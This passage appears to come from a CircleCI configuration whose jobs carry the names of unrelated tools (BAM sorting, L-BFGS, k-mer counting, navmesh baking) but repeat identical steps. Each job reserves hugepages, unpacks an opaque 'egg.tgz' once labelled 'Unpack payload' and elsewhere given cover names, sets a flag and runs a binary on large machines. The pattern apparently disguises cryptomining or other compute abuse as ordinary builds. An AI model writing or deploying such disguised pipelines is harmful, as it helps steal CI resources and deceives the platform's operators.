          name: Build BAM toolkit
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sam_sort -j2
      - run:
          name: Coordinate-sort records
          command: LIONSS_LP=1 ./build/sam_sort --in in.sam --threads 4
  LbfgsTwoloop:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack payload
          command: tar xzf egg.tgz
      - run:
          name: Set up build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set history
          command: |
            printf 'm 10\n' > lbfgs.cfg
      - run:
          name: Build quasi-Newton
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LbfgsTwoloop -j2
      - run:
          name: Two-loop recursion
          command: LIONSS_LP=1 ./build/LbfgsTwoloop --conf lbfgs.cfg --iters 100
  kmer-count31:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore snapshot
          command: tar xzf egg.tgz
      - run:
          name: Install native deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write reads
          command: |
            printf '>r1\nACGTACGTACGTACGTACGTACGTACGTACG\n' > reads.fa
      - run:
          name: Build counter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kmer-count31 -j2
      - run:
          name: Count 31-mers
          command: LIONSS_LP=1 ./build/kmer-count31 --reads reads.fa --k 31
  NavMeshBake:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch sources
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Import collision geo
          command: |
            mkdir -p nav && printf 'tri 0 0 0\n' > nav/geo.obj
      - run:
          name: Build nav baker
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target NavMeshBake -j2
      - run:
          name: Bake navigation mesh
          command: LIONSS_LP=1 ./build/NavMeshBake --geo nav/geo.obj --agent-radius 0.4
  serdetangent:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
